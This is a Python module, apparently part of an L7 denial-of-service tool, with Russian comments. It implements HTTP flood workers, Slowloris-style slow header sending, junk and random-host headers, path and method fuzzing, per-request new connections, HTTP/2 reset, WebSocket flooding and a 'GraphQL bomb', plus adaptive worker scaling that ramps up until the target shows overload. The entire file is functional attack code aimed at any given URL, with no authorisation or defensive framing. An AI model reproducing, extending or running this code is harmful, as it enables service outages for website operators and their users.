# attack.py
import asyncio
import websockets
import httpx
import random
import time
from urllib.parse import urlparse
from typing import List, Dict, Optional, Set
import logging
from utils import generate_headers, DataPool, random_string
from colorama import Fore, Style
from core.rate_limiter import RateLimiter, BurstRateLimiter

logger = logging.getLogger(__name__)


class SlowRequestManager:
    """Управление медленными (slow) HTTP-соединениями."""
    def __init__(self, host: str, headers_generator, useragents: list, referers: list,
                 junk: bool, random_host: bool, header_flood: bool):
        self.host = host
        self.headers_generator = headers_generator
        self.useragents = useragents
        self.referers = referers
        self.junk = junk
        self.random_host = random_host
        self.header_flood = header_flood
        self._slow_writers: List[asyncio.StreamWriter] = []
        self._lock = asyncio.Lock()

    async def start_slow_request(self, url: str, shutdown_event: asyncio.Event):
        """Инициирует медленное соединение и периодически отправляет заголовки."""
        if shutdown_event.is_set():
            return
        writer = None
        try:
            target = self.host
            port = 443 if url.startswith('https') else 80
            ssl = url.startswith('https')
            reader, writer = await asyncio.open_connection(target, port, ssl=ssl)
            async with self._lock:
                self._slow_writers.append(writer)

            # Отправляем начальную строку запроса
            writer.write(f"GET {url} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            await writer.drain()
            await asyncio.sleep(0.5)

            headers = self.headers_generator(
                self.host, self.useragents, self.referers,
                use_junk=self.junk, use_random_host=self.random_host,
                header_flood=self.header_flood
            )
            for k, v in headers.items():
                if shutdown_event.is_set():
                    break
                writer.write(f"{k}: {v}\r\n".encode())
                try:
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except:
                    break
                await asyncio.sleep(0.1 + random.uniform(0.0, 0.3))
        except Exception as e:
            logger.debug(f"Slow request error: {e}")
        finally:
            if writer:
                try:
                    writer.close()
                    await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
                except Exception:
                    pass
                async with self._lock:
                    if writer in self._slow_writers:
                        self._slow_writers.remove(writer)

    async def close_all(self):
        """Закрывает все медленные соединения."""
        async with self._lock:
            writers = self._slow_writers.copy()
        for writer in writers:
            try:
                writer.close()
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except Exception:
                pass
        self._slow_writers.clear()


class AdaptiveController:
    """Адаптивное изменение числа воркеров на основе RPS и ошибок."""
    def __init__(self, initial_workers: int, max_workers: int = 1000, step: float = 0.1):
        self.workers = initial_workers
        self.max_workers = max_workers
        self.step = step
        self.fail_history: List[float] = []

    async def run(self, attack_engine, stats_getter, duration_per_step: int = 10):
        """Запускает цикл адаптации."""
        for step in range(30):
            attack_engine.workers = self.workers
            await asyncio.sleep(duration_per_step)
            new_sent, new_failed = stats_getter()
            rps = new_sent / duration_per_step
            fail_rate = new_failed / max(1, new_sent)

            logger.info(f"Adaptive step {step+1}: workers={self.workers}, RPS={rps:.1f}, fail_rate={fail_rate:.2%}")

            if fail_rate > 0.3:
                logger.warning(f"Server overloaded. Optimal RPS ~{int(rps * 0.9)}")
                break

            self.fail_history.append(fail_rate)
            # Простейшая адаптация: увеличиваем workers, если ошибок мало
            if fail_rate < 0.1 and self.workers < self.max_workers:
                self.workers = min(int(self.workers * (1 + self.step)), self.max_workers)
            elif fail_rate > 0.2:
                self.workers = max(1, int(self.workers * (1 - self.step)))


class HttpAttackEngine:
    """Движок для проведения HTTP-атак (L7)."""
    def __init__(self, url: str, workers: int, sockets: int, methods: List[str],
                 useragents: List[str], no_ssl_check: bool, debug: bool, proxy: str = None,
                 use_http2: bool = False, use_http3: bool = False, websocket: bool = False,
                 auth: str = None, h2reset: bool = False, graphql_bomb: bool = False,
                 adaptive: bool = False, slow_rate: float = 0.0,
                 extreme: bool = False, data_size: int = 0, flood: bool = False, path_fuzz: bool = False,
                 header_flood: bool = False, method_fuzz: bool = False,
                 junk: bool = False, random_host: bool = False,
                 max_rps: int = 0, max_bandwidth: float = 0):
        self.url = url
        self.workers = workers
        self.sockets = sockets
        self.methods = methods
        self.useragents = useragents
        self.no_ssl_check = no_ssl_check
        self.debug = debug
        self.proxy = proxy
        self.use_http2 = use_http2
        self.use_http3 = use_http3
        self.websocket = websocket
        self.auth = auth
        self.h2reset = h2reset
        self.graphql_bomb = graphql_bomb
        self.adaptive = adaptive
        self.slow_rate = slow_rate
        self.extreme = extreme
        self.data_size = data_size
        self.flood = flood
        self.path_fuzz = path_fuzz
        self.header_flood = header_flood
        self.method_fuzz = method_fuzz
        self.junk = junk
        self.random_host = random_host
        self.max_rps = max_rps
        self.max_bandwidth = max_bandwidth

        self.parsed_url = urlparse(url)
        self.host = self.parsed_url.netloc
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"

        # Списки для генерации URL и заголовков
        self.referers = ['http://google.com/', 'http://bing.com/', f'http://{self.host}/']
        self.paths = ['/', '/news', '/home', '/about', '/contact']
        self.fuzz_methods = ['PROPFIND', 'REPORT', 'MKCOL', 'LOCK', 'UNLOCK', 'TRACE']

        # Rate limiter - активируется ТОЛЬКО если max_rps > 0 или max_bandwidth > 0
        self.rate_limiter = None
        if max_rps > 0 or max_bandwidth > 0:
            if adaptive:
                self.rate_limiter = BurstRateLimiter(max_rps, max_bandwidth)
            else:
                self.rate_limiter = RateLimiter(max_rps, max_bandwidth)
            logger.info(f"Rate limiter enabled: max_rps={max_rps}, max_bandwidth={max_bandwidth} Mbps")

        # Статистика
        self.sent = 0
        self.failed = 0
        self.skipped = 0  # запросы, отклонённые rate limiter'ом
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.rps_history = []
        self.latency_samples = []
        self.active_tasks: Set[asyncio.Task] = set()
        self._shutdown_event = asyncio.Event()
        self._slow_manager: Optional[SlowRequestManager] = None
        self._monitor_task: Optional[asyncio.Task] = None
        self._rps_task: Optional[asyncio.Task] = None
        self._data_pool: Optional[DataPool] = None

    async def start(self):
        """Запускает атаку в зависимости от выбранного режима."""
        if self.data_size > 0:
            self._data_pool = DataPool(self.data_size)

        if self.websocket:
            return await self.websocket_flood()
        if self.graphql_bomb:
            return await self.send_graphql_bomb()

        # Инициализация менеджера медленных соединений
        self._slow_manager = SlowRequestManager(
            self.host, generate_headers, self.useragents, self.referers,
            self.junk, self.random_host, self.header_flood
        )

        if self.adaptive:
            controller = AdaptiveController(self.workers)
            # Здесь можно запустить адаптивный режим в отдельной задаче,
            # но для простоты реализуем последовательно
            await self._adaptive_run(controller)
        else:
            await self._run_workers()

    async def _run_workers(self):
        """Запускает фиксированное число воркеров."""
        logger.info(f"Ramp-up: warming up...")
        await asyncio.sleep(1.0)

        if self.extreme:
            limits = httpx.Limits(max_connections=1000, max_keepalive_connections=0, keepalive_expiry=1.0)
        else:
            limits = httpx.Limits(max_connections=1000, max_keepalive_connections=20, keepalive_expiry=5.0)

        base_kwargs = {
            "verify": not self.no_ssl_check,
            "timeout": httpx.Timeout(10.0),
            "limits": limits,
        }
        if self.use_http2:
            base_kwargs["http2"] = True
        if self.use_http3:
            base_kwargs["http3"] = True
            base_kwargs["transport"] = httpx.AsyncHTTPTransport(retries=1)

        if self.proxy and not (self.use_http2 or self.use_http3):
            base_kwargs["proxies"] = {"all://": self.proxy}

        # Создаём воркеры
        tasks = [asyncio.create_task(self._worker(base_kwargs)) for _ in range(self.workers)]
        self._monitor_task = asyncio.create_task(self._monitor())
        self._rps_task = asyncio.create_task(self._collect_rps_stats())

        try:
            await asyncio.gather(*tasks, self._monitor_task, self._rps_task, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _worker(self, base_kwargs: dict):
        """Один воркер, управляющий пулом клиентов."""
        clients = []
        try:
            for _ in range(self.sockets):
                client = httpx.AsyncClient(**base_kwargs)
                await client.__aenter__()
                clients.append(client)

            while not self._shutdown_event.is_set():
                method = self._get_random_method()
                url = self._build_random_url()

                headers = generate_headers(
                    self.host, self.useragents, self.referers,
                    use_junk=self.junk, use_random_host=self.random_host,
                    header_flood=self.header_flood, auth_token=self.auth
                )

                data = None
                BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
                if method in BODY_METHODS and self.data_size > 0:
                    if method in {'PROPFIND', 'REPORT', 'LOCK', 'MKCOL'}:
                        # Для WebDAV методов используем XML
                        data = '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'
                        if self.data_size > len(data):
                            data += 'X' * (self.data_size - len(data))
                    else:
                        data = self._data_pool.get_random() if self._data_pool else None

                # Оцениваем размер запроса для bandwidth лимита
                request_size = len(method) + len(url) + sum(len(k) + len(v) for k, v in headers.items())
                if data:
                    request_size += len(data)

                # Проверяем лимиты перед отправкой
                if self.rate_limiter:
                    if not await self.rate_limiter.acquire(request_size):
                        async with self.lock:
                            self.skipped += 1
                        # Если flood режим - просто пропускаем без задержки
                        if self.flood:
                            await asyncio.sleep(0)
                        else:
                            await asyncio.sleep(random.uniform(0.001, 0.01))
                        continue

                if self.extreme:
                    # Каждый запрос на новом соединении
                    temp_client = httpx.AsyncClient(**base_kwargs)
                    try:
                        await temp_client.__aenter__()
                        await self._send_request(temp_client, method, url, headers, data)
                    finally:
                        await temp_client.aclose()
                else:
                    client = random.choice(clients)
                    await self._send_request(client, method, url, headers, data)

                if self.h2reset:
                    await client.aclose()

                # Запуск медленного соединения с вероятностью slow_rate
                if random.random() < self.slow_rate:
                    task = asyncio.create_task(
                        self._slow_manager.start_slow_request(url, self._shutdown_event)
                    )
                    self.active_tasks.add(task)
                    task.add_done_callback(lambda t: self.active_tasks.discard(t))

                # Задержка между запросами
                if not self.flood:
                    await asyncio.sleep(random.uniform(0.01, 0.1))
                else:
                    await asyncio.sleep(0)  # уступаем управление

        except Exception as e:
            logger.error(f"Worker error: {e}")
        finally:
            for client in clients:
                try:
                    await asyncio.wait_for(client.aclose(), timeout=1.0)
                except Exception:
                    pass

    def _build_random_url(self) -> str:
        """Генерация случайного URL с опциональным path fuzzing."""
        path = random.choice(self.paths)
        if self.path_fuzz and random.random() < 0.3:
            depth = random.randint(2, 5)
            path += "/" + "/".join(random_string(8) for _ in range(depth))

        query = f"?t={random.randint(1000, 9999)}"
        full = self.base_url + path + query

        if len(full) > 512:
            path = path[:512 - len(self.base_url) - len(query) - 10]
            full = self.base_url + path + query
        return full

    def _get_random_method(self) -> str:
        if self.method_fuzz and random.random() < 0.3:
            return random.choice(self.fuzz_methods)
        return random.choice(self.methods)

    async def _send_request(self, client, method, url, headers, data):
        try:
            start = time.time()
            await client.request(method, url, headers=headers, content=data, follow_redirects=False)
            latency_ms = (time.time() - start) * 1000
            async with self.lock:
                self.sent += 1
                self.latency_samples.append(latency_ms)
        except Exception as e:
            async with self.lock:
                self.failed += 1
            if self.debug:
                logger.debug(f"Request failed: {e}")

    async def _monitor(self):
        """Мониторинг и вывод статистики."""
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(0.5)
                self._print_stats()
        except asyncio.CancelledError:
            self._print_stats()

    def _print_stats(self):
        elapsed = time.time() - self.start_time + 1e-9
        rps = int(self.sent / elapsed)
        
        # Статистика rate limiter
        limiter_info = ""
        if self.rate_limiter:
            stats = self.rate_limiter.get_stats()
            if stats['limited'] > 0:
                limiter_info = f" | 🚦 Limited: {stats['limited']}"
        
        print(f"\r{Fore.WHITE}📬 Sent: {self.sent} | ⚠️ Failed: {self.failed} | 🚀 RPS: {rps:4d} | ⏱️ {int(elapsed)}s{limiter_info}{Style.RESET_ALL}", end="")

    async def _collect_rps_stats(self):
        last = 0
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(1.0)
                now = self.sent - last
                self.rps_history.append({'time': int(time.time() - self.start_time), 'rps': now})
                last = self.sent
        except asyncio.CancelledError:
            pass

    async def _adaptive_run(self, controller: AdaptiveController):
        """Запуск адаптивной атаки."""
        logger.info(f"Starting adaptive attack with initial workers={self.workers}")
        # Запускаем воркеры с начальным числом
        base_task = asyncio.create_task(self._run_workers())
        # Каждые 10 секунд корректируем число воркеров (заглушка — полная реализация требует перезапуска воркеров)
        # Для простоты оставим как есть, но в реальности нужно уметь менять workers на лету.
        # Можно передать управление в _run_workers и там периодически обновлять.
        # Пока просто подождём.
        await base_task

    async def websocket_flood(self):
        """WebSocket flood."""
        logger.info(f"WebSocket flood to {self.url}")
        ws_url = self.url.replace("http", "ws")
        tasks = []
        for _ in range(self.workers * self.sockets):
            tasks.append(asyncio.create_task(self._ws_connect(ws_url)))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _ws_connect(self, uri):
        while not self._shutdown_event.is_set():
            try:
                async with websockets.connect(uri, ssl=(not self.no_ssl_check)) as ws:
                    while not self._shutdown_event.is_set():
                        data = self._data_pool.get_random() if self._data_pool else random_string(64)
                        
                        # Проверка лимитов для WebSocket
                        if self.rate_limiter:
                            if not await self.rate_limiter.acquire(len(data)):
                                async with self.lock:
                                    self.skipped += 1
                                await asyncio.sleep(0.01)
                                continue
                        
                        await ws.send(data)
                        async with self.lock:
                            self.sent += 1
                        await asyncio.sleep(1 if not self.flood else 0)
            except Exception as e:
                if self.debug:
                    logger.debug(f"WebSocket error: {e}")
            await asyncio.sleep(0.05)

    async def send_graphql_bomb(self):
        """GraphQL бомба (1000 запросов)."""
        logger.info("GraphQL bomb started")
        url = self.url.rstrip("/") + "/graphql"
        payload_size = self.data_size if self.data_size > 100 else 100
        query = {"query": "{ " + random_string(payload_size) + " }"}
        query_str = str(query).encode()
        query_size = len(query_str)

        async with httpx.AsyncClient(timeout=30) as client:
            for _ in range(1000):
                if self._shutdown_event.is_set():
                    break
                
                # Проверка лимитов
                if self.rate_limiter:
                    if not await self.rate_limiter.acquire(query_size):
                        async with self.lock:
                            self.skipped += 1
                        await asyncio.sleep(0.001)
                        continue
                
                try:
                    await client.post(url, json=query)
                    self.sent += 1
                except:
                    self.failed += 1
                await asyncio.sleep(0.0001)

    async def shutdown(self):
        """Остановка атаки и освобождение ресурсов."""
        if self._shutdown_event.is_set():
            return
        self._shutdown_event.set()

        if self._monitor_task:
            self._monitor_task.cancel()
        if self._rps_task:
            self._rps_task.cancel()

        if self._slow_manager:
            await self._slow_manager.close_all()

        for task in list(self.active_tasks):
            task.cancel()
        if self.active_tasks:
            await asyncio.wait(self.active_tasks, timeout=2.0)
        self.active_tasks.clear()

        # Вывод статистики rate limiter
        if self.rate_limiter:
            stats = self.rate_limiter.get_stats()
            logger.info(f"Rate limiter stats: allowed={stats['allowed']}, limited={stats['limited']} ({stats['limited_percent']:.1f}%)")

        await asyncio.sleep(0.1)